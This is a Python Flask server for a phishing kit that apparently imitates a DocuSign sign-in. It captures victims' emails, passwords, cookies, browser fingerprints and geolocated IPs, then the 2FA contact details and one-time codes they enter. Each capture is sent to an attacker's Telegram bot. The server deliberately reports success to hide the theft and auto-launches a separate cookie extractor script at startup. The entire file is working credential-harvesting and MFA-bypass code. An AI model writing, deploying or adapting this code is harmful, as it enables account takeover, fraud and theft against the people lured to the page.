from flask import Flask, request, jsonify, send_from_directory
import os
import requests
import threading
import subprocess
import time
import sys
from datetime import datetime
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

app = Flask(__name__, static_folder='static')
app.secret_key = os.getenv('SECRET_KEY', 'your-secret-key-here')

# Disable caching for all routes
@app.after_request
def add_header(response):
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, post-check=0, pre-check=0, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '-1'
    return response

# Telegram configuration
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', 'YOUR_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', 'YOUR_CHAT_ID')

def send_telegram_alert(message: str):
    """Send alert to Telegram bot"""
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == 'YOUR_BOT_TOKEN':
        return False
    
    if not TELEGRAM_CHAT_ID or TELEGRAM_CHAT_ID == 'YOUR_CHAT_ID':
        return False
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    
    try:
        response = requests.post(url, json=payload, timeout=10)
        response.raise_for_status()
        return True
    except Exception as e:
        return False

@app.route('/')
def home():
    return send_from_directory('.', 'login.html')

@app.route('/ds-logo-default.svg')
def logo():
    return send_from_directory('.', 'ds-logo-default.svg')

@app.route('/docu-logo.svg')
def favicon():
    return send_from_directory('.', 'docu-logo.svg')

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data provided'}), 400

    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    cookies = data.get('cookies', 'None')
    browser_info = data.get('browserInfo', {})
    
    if not email or not password:
        return jsonify({'error': 'Email and password are required'}), 400

    # Get client information - handle proxy headers for Render/Heroku
    # Try to get real IP from proxy headers first
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip:
        # X-Forwarded-For can contain multiple IPs, get the first one (client IP)
        ip = ip.split(',')[0].strip()
    
    # Fallback to other common proxy headers
    if not ip or ip == '127.0.0.1':
        ip = request.headers.get('X-Real-IP', request.remote_addr)
    
    user_agent = request.headers.get('User-Agent', 'Unknown')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Get additional headers
    accept_language = request.headers.get('Accept-Language', 'Unknown')
    referer = request.headers.get('Referer', 'Direct')
    
    # Get location info from IP (using a free API)
    location_info = "Unknown"
    country = "Unknown"
    city = "Unknown"
    isp = "Unknown"
    
    # Get geolocation for all IPs (including when deployed)
    if ip and ip != "127.0.0.1" and not ip.startswith("192.168") and not ip.startswith("10."):
        try:
            geo_response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if geo_response.status_code == 200:
                geo_data = geo_response.json()
                if geo_data.get('status') == 'success':
                    country = geo_data.get('country', 'Unknown')
                    city = geo_data.get('city', 'Unknown')
                    region = geo_data.get('regionName', 'Unknown')
                    isp = geo_data.get('isp', 'Unknown')
                    location_info = f"{city}, {region}, {country}"
        except Exception as e:
            pass
    else:
        location_info = "Localhost (Testing)"
        country = "Local"
        city = "Local Machine"
    
    # Prepare enhanced login notification message
    connection_info = browser_info.get('connection', 'Unknown')
    if isinstance(connection_info, dict):
        connection_str = f"{connection_info.get('effectiveType', 'Unknown')} (↓{connection_info.get('downlink', '?')}Mbps, RTT:{connection_info.get('rtt', '?')}ms)"
    else:
        connection_str = str(connection_info)
    
    message = (
        "🚨 *NEW LOGIN CAPTURED* 🚨\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "👤 *CREDENTIALS*\n"
        f"📧 Email: `{email}`\n"
        f"🔑 Password: `{password}`\n\n"
        "🌍 *LOCATION INFO*\n"
        f"🌐 IP Address: `{ip}`\n"
        f"🗺 Location: `{location_info}`\n"
        f"🏳️ Country: `{country}`\n"
        f"🏙 City: `{city}`\n"
        f"📡 ISP: `{isp}`\n\n"
        "💻 *DEVICE INFO*\n"
        f"🖥 User Agent: `{user_agent}`\n"
        f"⚙️ Platform: `{browser_info.get('platform', 'Unknown')}`\n"
        f"🌐 Languages: `{browser_info.get('languages', 'Unknown')}`\n"
        f"📱 Screen: `{browser_info.get('screenResolution', 'Unknown')} ({browser_info.get('screenColorDepth', 'Unknown')})`\n"
        f"🪟 Window: `{browser_info.get('windowSize', 'Unknown')}`\n"
        f"🕐 Timezone: `{browser_info.get('timezone', 'Unknown')} (UTC{browser_info.get('timezoneOffset', '?')})`\n"
        f"🔌 Connection: `{connection_str}`\n"
        f"🖱 Touch: `{'Yes' if browser_info.get('touchSupport') else 'No'}`\n"
        f"⚙️ CPU Cores: `{browser_info.get('hardwareConcurrency', 'Unknown')}`\n"
        f"💾 Memory: `{browser_info.get('deviceMemory', 'Unknown')} GB`\n"
        f"🔗 Referer: `{browser_info.get('referrer', 'Direct')}`\n"
        f"🚫 DNT: `{browser_info.get('doNotTrack', 'Unknown')}`\n\n"
        "🍪 *COOKIES*\n"
        f"`{cookies if cookies != 'None' else 'No cookies found'}`\n\n"
        f"⏰ *Time:* `{timestamp}`\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    
    # Send notification to Telegram
    send_telegram_alert(message)
    
    # Always return success to avoid revealing the monitoring
    return jsonify({
        'success': True,
        'redirect': '/otp-method.html'
    })

@app.route('/submit-otp-method', methods=['POST'])
def submit_otp_method():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data provided'}), 400

    method = data.get('method', '').strip()
    contact = data.get('contact', '').strip()
    
    if not method or not contact:
        return jsonify({'error': 'Method and contact information are required'}), 400

    # Get client information
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip:
        ip = ip.split(',')[0].strip()
    
    if not ip or ip == '127.0.0.1':
        ip = request.headers.get('X-Real-IP', request.remote_addr)
    
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Prepare OTP method notification message
    method_emoji = "📧" if method == "email" else "📱"
    method_name = "Email" if method == "email" else "SMS/Phone"
    
    message = (
        "🔐 *2FA METHOD SELECTED* 🔐\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{method_emoji} *Verification Method:* `{method_name}`\n"
        f"📞 *Contact:* `{contact}`\n"
        f"🌐 *IP Address:* `{ip}`\n"
        f"⏰ *Time:* `{timestamp}`\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    
    # Send notification to Telegram
    send_telegram_alert(message)
    
    return jsonify({'success': True})

@app.route('/verify-otp', methods=['POST'])
def verify_otp():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data provided'}), 400

    otp = data.get('otp', '').strip()
    
    if not otp:
        return jsonify({'error': 'OTP code is required'}), 400

    # Get client information
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip:
        ip = ip.split(',')[0].strip()
    
    if not ip or ip == '127.0.0.1':
        ip = request.headers.get('X-Real-IP', request.remote_addr)
    
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Prepare OTP code notification message
    message = (
        "🔢 *OTP CODE CAPTURED* 🔢\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔐 *OTP Code:* `{otp}`\n"
        f"🌐 *IP Address:* `{ip}`\n"
        f"⏰ *Time:* `{timestamp}`\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    
    # Send notification to Telegram
    send_telegram_alert(message)
    
    return jsonify({'success': True})

@app.route('/otp-method.html')
def otp_method():
    return send_from_directory('.', 'otp-method.html')

@app.route('/otp-verify.html')
def otp_verify():
    return send_from_directory('.', 'otp-verify.html')

@app.route('/static/<path:path>')
def serve_static(path):
    return send_from_directory('static', path)

if __name__ == '__main__':
    # Function to run cookie extractor after server starts
    def run_extractor():
        time.sleep(3) # Wait for server to start
        print("\n[*] Auto-starting Cookie Extractor...")
        try:
            # Run the independent script
            subprocess.Popen([sys.executable, 'cookie_tool.py'])
        except Exception as e:
            print(f"[!] Failed to start cookie tool: {e}")

    # Start extractor in background thread
    threading.Thread(target=run_extractor, daemon=True).start()

    # Create static directory if it doesn't exist
    os.makedirs('static', exist_ok=True)
    
    # Run the Flask app
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)